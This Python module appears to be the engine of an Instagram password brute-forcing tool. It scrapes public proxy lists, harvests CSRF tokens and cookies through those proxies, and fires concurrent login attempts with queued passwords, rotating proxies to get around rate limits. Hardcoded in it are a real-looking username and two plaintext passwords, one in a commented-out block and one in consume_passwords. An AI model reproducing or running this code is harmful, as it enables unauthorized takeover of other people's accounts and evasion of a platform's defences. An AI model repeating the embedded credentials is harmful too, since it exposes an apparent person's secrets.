from __future__ import absolute_import

import logging
import logging.config

import aiohttp
import asyncio
import signal

from app import settings

from app.lib import exceptions
from app.lib.logging import AppLogger
from app.lib.sessions import InstagramSession, ProxySession
from app.lib.users import User
from app.lib.utils import (auto_logger, get_token_from_cookies,
    get_token_from_response, get_cookies_from_response)


__all__ = ('EngineAsync', )


class Engine(object):

    __loggers__ = {
        '__base__': 'Instagram Engine',
        'attack': 'Attack',
        '_test_attack_async': 'Test Async Attack',
        '_test_attack_sync': 'Test Sync Attack',
        '_attack_sync': 'Synchronous Attack',
        '_attack_asnc': 'Asynchronous Attack',
        'consume_passwords': 'Login with Proxy',
        'populate_proxies': 'Populating Proxies',
        'populate_passwords': 'Populating Passwords',
        'get_tokens': 'Fetching Tokens',
        'get_cookies': 'Fetching Cookies',
        'consume_attempts': 'Storing Attempted Password',
    }

    def __init__(self, username):
        self.user = User(username)
        logging.setLoggerClass(AppLogger)
        self.log = logging.getLogger(self.__loggers__['__base__'])


class ExceptionHandler(object):

    def _handle_api_exception(self, exc):
        if getattr(exc, 'proxy', None) is None:
            raise RuntimeError(
                f"Exception {exc.__class__.__name__} was not assigned "
                "a proxy."
            )

        if isinstance(exc, exceptions.BadProxyException):
            self.proxy_list.remove(exc.proxy)
            self.log.warn(str(exc))
        else:
            self.log.error(str(exc))

    def _handle_app_exception(self, exc):
        if isinstance(exc, exceptions.ApiException):
            self._handle_api_exception(exc)
        else:
            raise exc

    def _handle_response_exception(self, exc):
        if isinstance(exc, exceptions.InstagramAttackException):
            self._handle_app_exception(exc)
        else:
            self.log.error(str(exc))
            #raise exc


class EngineProxyMixin(ExceptionHandler):

    def base_response_callback(self, fut):
        exc = fut.exception()
        if exc:
            self._handle_response_exception(exc)
        else:
            if not fut.result():
                raise RuntimeError(
                    "Futures should not be returning a null result, an "
                    "exception should be raised before this happens."
                )
            return fut.result()

    def token_callback(self, fut):
        results = self.base_response_callback(fut)
        if results:
            proxy, response = results
            try:
                token = get_token_from_response(response, proxy=proxy, strict=True)
            except exceptions.TokenNotInResponse as exc:
                self.proxy_list.remove(proxy)
                self.log.error(str(exc))
            else:
                self.good_proxies.append(proxy)
                self.log.success("Received token %s." % token, extra={
                    'proxy': proxy
                })

    def cookies_callback(self, fut):
        results = self.base_response_callback(fut)
        if results:
            proxy, response = results
            try:
                get_cookies_from_response(response)
            except exceptions.CookiesNotInResponse as e:
                self.proxy_list.remove(proxy)
                self.log.error(e)
            else:
                self.good_proxies.append(proxy)
                self.log.success("Received cookies.", extra={
                    'proxy': proxy
                })

    async def get_proxy_responses(self, loop, log, callback, as_cookies=False, as_token=True):

        async def get_responses():
            tasks = []
            async with InstagramSession() as session:
                for i in range(len(self.proxy_list[:20])):
                    proxy = self.proxy_list[i]
                    task = asyncio.ensure_future(session.get_base_response(
                        proxy,
                        as_cookies=as_cookies,
                        as_token=as_token,
                    ))
                    task.add_done_callback(callback)
                    tasks.append(task)

                    # TODO: Use Logging ContextFilter to add contextual information
                    # for specific task.
                    task.name = f"Task {i} for Proxy {proxy.ip}"

                return await asyncio.gather(*tasks, return_exceptions=True)

        async def filter_responses(results):
            filtered = []
            for result in results:
                if not isinstance(result, Exception):
                    filtered.append(result)
            return filtered

        # We do this 20 concurrent requests at a time, but there is a chance that
        # all of the proxies are bad, so we would have to keep going.
        # TODO: Use a semaphore.
        results = []
        while not results:
            results = await get_responses()

        return await filter_responses(results)

    @auto_logger(show_running=False)
    async def get_cookies(self, loop, log):
        results = await self.get_proxy_responses(loop, log, self.cookies_callback,
            as_cookies=True, as_token=False)
        return [(proxy, response.cookies) for proxy, response in results]

    @auto_logger(show_running=False)
    async def get_tokens(self, loop, log):
        """
        Returns a list of tokens based on 20 concurrent requests to the Instagram
        API.  On average, it returns about 6-7 tokens, which we will use as fallbacks
        in case we need them when requests fail for token related reasons.

        The higher the value of TOKEN_REQUEST_LIMIT (i.e. the number of
        concurrent requests to retrieve a token), the slighly longer this process
        takes, but the more bad proxies we can rule out from the get go.
        """
        return await self.get_proxy_responses(loop, log, self.token_callback,
            as_cookies=False, as_token=True)


class EngineAsync(Engine, EngineProxyMixin):

    def __init__(self, username, mode='async', test=False, password=None):
        super(EngineAsync, self).__init__(username)
        self.lock = asyncio.Lock()

        self.mode = mode

        if test and not password:
            raise exceptions.EngineException("Must provide password to test async attack.")

        self.test = test
        self.password = password  # Used for Testing

        self.stop_event = asyncio.Event()
        self.passwords = asyncio.Queue()
        self.attempts = asyncio.Queue()

        self.proxy_list = []
        self.good_proxies = []

        self.option_handler = {
            ('async', False): self._attack_async,
            ('sync', False): self._attack_sync,
            ('async', True): self._test_attack_async,
            ('sync', True): self._test_attack_sync,
        }

    @auto_logger
    async def populate_passwords(self, loop, log):
        """
        Retrieves passwords generated passwords that have not been attempted
        from the User object and populates the password queue.
        """
        for password in self.user.get_new_attempts():
            self.passwords.put_nowait(password)

        if self.passwords.empty():
            raise exceptions.EngineException("No new passwords to try.")

        log.info(f"Populated {self.passwords.qsize()} Passwords")

    @auto_logger
    async def populate_proxies(self, loop, log):
        """
        Retrieves proxies by using the ProxyApi to scrape links defined
        in settings.  Each returned response is parsed and converted into
        a list of Proxy objects.
        """
        def callback(fut):
            result = fut.result()
            for proxy in result:
                if proxy not in self.proxy_list:
                    self.proxy_list.append(proxy)

        tasks = []
        async with ProxySession() as session:
            for url in settings.PROXY_LINKS:
                log.info(f"Scraping Proxies at {url}")
                task = asyncio.ensure_future(session.get_proxies(
                    url,
                ))
                tasks.append(task)
                task.add_done_callback(callback)

            log.info(f"Scraping Proxies at {settings.EXTRA_PROXY}")
            task = asyncio.ensure_future(session.get_extra_proxies())
            tasks.append(task)
            task.add_done_callback(callback)

            await asyncio.gather(*tasks, return_exceptions=True)

        log.info(f"Populated {len(self.proxy_list)} Proxies")

    @auto_logger
    async def _attack_async(self, loop, log):
        """
        Right now, we are not going to wrap this in handle_exceptions
        because we do not have the exception handling sealed off enough
        yet in order to allow the failed requests to not close the loop.

        This might have something to do with return_exceptions **kwarg in the
        asyncio.gather_tasks call.
        """
        tokens = await asyncio.ensure_future(self.get_tokens(loop))
        print(tokens)

    @auto_logger
    async def _test_attack_async(self, loop, log):

        async def get_login_results(results, limit=20):
            async with InstagramSession() as session:
                tasks = []
                for proxy, cookies in results:
                    token = get_token_from_cookies(cookies)
                    task = asyncio.ensure_future(session.login(
                        self.user.username, self.password, token, proxy
                    ))
                    task.add_done_callback(self.base_response_callback)
                    tasks.append(task)
                return await asyncio.gather(*tasks, return_exceptions=True)

        results = await asyncio.ensure_future(self.get_cookies(loop))
        responses = await get_login_results(results)
        print(responses)

    @auto_logger
    async def _attack_sync(self, loop, log):
        pass

    @auto_logger
    async def _test_attack_sync(self, loop, log):
        pass
        # with requests.Session() as session:
        #     session.headers = settings.HEADER.copy()
        #     session.headers['x-csrftoken'] = token

        #     session.proxies.update({
        #         'http': f"http://{proxy.ip}:{proxy.port}",
        #         'https': f"http://{proxy.ip}:{proxy.port}",
        #     })
        #     response = session.post(
        #         settings.INSTAGRAM_LOGIN_URL,
        #         timeout=(6, 10),
        #         data={
        #             'username': 'nickmflorin',
        #             'password': 'Ca23tlin083801331',
        #         },
        #     )
        #     return response.json()

    @auto_logger
    async def attack(self, loop, log):
        # May want to catch other signals too - these are not currently being
        # used, but could probably be expanded upon.
        signals = (signal.SIGHUP, signal.SIGTERM, signal.SIGINT)
        for s in signals:
            loop.add_signal_handler(
                s, lambda s=s: asyncio.create_task(self.shutdown(s, loop)))

        try:
            prep_tasks = (
                loop.create_task(
                    self.handle_exception(
                        self.populate_proxies(loop), loop
                    )
                ),
                loop.create_task(
                    self.handle_exception(
                        self.populate_passwords(loop), loop
                    )
                )
            )

            await asyncio.gather(*prep_tasks)

            attacker = self.option_handler[(self.mode, self.test)]
            await attacker(loop)

        finally:
            self.log.info('Cleaning up')
            loop.stop()

    @auto_logger(show_running=False)
    async def consume_attempts(self, loop, log):
        while not self.stop_event.is_set():
            try:
                attempt = self.attempts.get_nowait()
            except asyncio.QueueEmpty:
                continue
            else:
                async with self.lock:
                    log.info(f"Storing User Attempt {attempt}")
                    self.user.add_password_attempt(attempt)

    @auto_logger(show_running=False)
    async def consume_passwords(self, tokens, loop, log):
        """
        Right now, we are going to try with only one token.  If we start running
        into issues, we can incorporate functionality to use backup tokesn if
        available.
        """
        def callback(fut):
            log.success(fut.result())
            exc = fut.exception()
            if exc:
                if isinstance(exc, exceptions.BadProxyException):
                    log.warn(str(exc), extra={'proxy': getattr(exc, 'proxy', None)})
                    if not hasattr(exc, 'proxy'):
                        log.error(f"Exception {exc.__class__.__name__} does not "
                            "have proxy attribute.")
                    elif exc.proxy is None:
                        log.error(f"Exception {exc.__class__.__name__} was not "
                            "assigned a proxy.")
                    else:
                        try:
                            self.proxy_list.remove(exc.proxy)
                        except ValueError:
                            log.error(f"{exc.proxy} not in the list... cannot remove.")
                else:
                    log.error(str(exc), extra={'proxy': getattr(exc, 'proxy', None)})

            # Logic that checks for authentication is doen in InstagramSession,
            # there will only be a result if it is authenticated.
            elif fut.result():
                result, password, proxy = fut.result()
                log.success(f"Authenticated!")
                self.stop_event.set()

        async def bound_login(sem, session, username, password, token, use_proxy):
            print("Waiting for sem")
            async with sem:
                print("FETCHING")
                await session.login(username, password, token, use_proxy)

        async def login_with_passwords(queue, token):
            tasks = []
            sem = asyncio.Semaphore(5)

            async with InstagramSession() as session:
                # We might have to remove the queue.empty() check if we are going
                # to put passwords back in if there is a failure with the proxy.
                # while not self.stop_event.is_set() and not queue.empty():
                for i in range(20):
                    use_proxy = self.proxy_list[i]
                    try:
                        password = queue.get_nowait()
                    except asyncio.QueueEmpty:
                        continue
                    else:
                        password = "Whispering3660664Blue!"
                        task = asyncio.create_task(bound_login(
                            sem,
                            session,
                            "nickmflorin",
                            password,
                            token,
                            use_proxy
                        ))
                        task.add_done_callback(callback)
                        tasks.append(task)

                print(f"TASKS : {len(tasks)}")
                return await asyncio.gather(*tasks)

        # Just try with first proxy and first token for now
        # proxy = self.proxy_list[0]
        # for i in range(10):
        #     token = tokens[i]
        #     results = await login_with_passwords(self.passwords, token)
        #     print(results)
        # # We might want to login in batches of passwords.
        # # We also have to make sure we do not run out of proxies!!
        # async def get_authentication_results():
        #     tasks = []
        #     async with self.lock:
        #         proxy = self.proxy_list[0]

        #     async with InstagramSession() as session:
        #         for i in range(25):

        #             proxy = self.proxy_list[i]
        #             task = asyncio.ensure_future(session.get_token(proxy))
        #             task.add_done_callback(callback)
        #             tasks.append(task)

        #         return await asyncio.gather(*tasks, return_exceptions=True)

        # async def filter_tokens(results):
        #     """
        #     For whatever reason, raising TokenNotInResponse in the session
        #     is causing a None value to be returned instead of the exception.
        #     For now, we will just filter out None as well.
        #     """
        #     tokens = []
        #     for result in results:
        #         if not isinstance(result, Exception) and result is not None:
        #             tokens.append(result)
        #     return tokens

        # tasks = []
        # sem = asyncio.Semaphore(1000)

        # async with InstagramSession() as session:
        #     for url in settings.PROXY_LINKS:
        #         log.info(f"Scraping Proxies at {url}")
        #         task = asyncio.ensure_future(session.get_proxies(
        #             url,
        #         ))
        #         tasks.append(task)
        #         task.add_done_callback(callback)

        #     log.info(f"Scraping Proxies at {settings.EXTRA_PROXY}")
        #     task = asyncio.ensure_future(session.get_extra_proxies())
        #     tasks.append(task)
        #     task.add_done_callback(callback)

        #     await asyncio.gather(*tasks, return_exceptions=True)

        # try:
        #     password = self.passwords.get_nowait()
        # except asyncio.QueueEmpty:
        #     continue
        # else:
        #     async with InstagramSession() as session:

        #         tasks = []
        #         while not self.stop_event.is_set() and len(self.proxy_list):
        #             async with self.lock:
        #                 proxy = self.proxy_list[0]

        #             task = asyncio.ensure_future(session.login(
        #                 self.user.username,
        #                 password,
        #                 token,
        #                 proxy,
        #             ))

        #             task.add_done_callback(callback)
        #             tasks.append(task)

        #         await asyncio.gather(*tasks, return_exceptions=True)

    async def handle_exception(self, coro, loop):
        """
        This does not seem to be working properly for all situations.
        """
        try:
            await coro
        except Exception as e:
            self.log.error(str(e))
            loop.stop()

    async def shutdown(self, signal, loop):

        self.log.info(f'Received exit signal {signal.name}...')
        tasks = [t for t in asyncio.all_tasks() if t is not
            asyncio.current_task()]

        [task.cancel() for task in tasks]

        self.log.info('Canceling outstanding tasks...')
        await asyncio.gather(*tasks)

        loop.stop()
        self.log.success('Shutdown complete.')
